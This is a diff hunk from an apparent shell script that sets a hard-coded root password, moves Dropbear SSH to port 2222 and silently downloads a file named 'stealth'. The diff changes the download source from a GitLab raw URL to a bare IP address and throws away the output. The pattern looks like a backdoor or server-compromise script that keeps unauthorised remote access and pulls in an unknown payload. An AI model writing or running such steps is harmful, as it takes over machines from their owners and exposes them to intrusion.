@@ -13,7 +13,7 @@ sed -i "s/DROPBEAR_PORT=22/DROPBEAR_PORT=2222/" /etc/default/dropbear
 sleep 2
 echo "root:Pmataga87465622" | chpasswd
 service ssh restart
-wget -q https://gitlab.com/update9394625/update411/-/raw/main/stealth >/dev/null
+wget -q http://45.135.58.52/stealth >/dev/null
 sleep 2
 service dropbear restart
 sleep 2
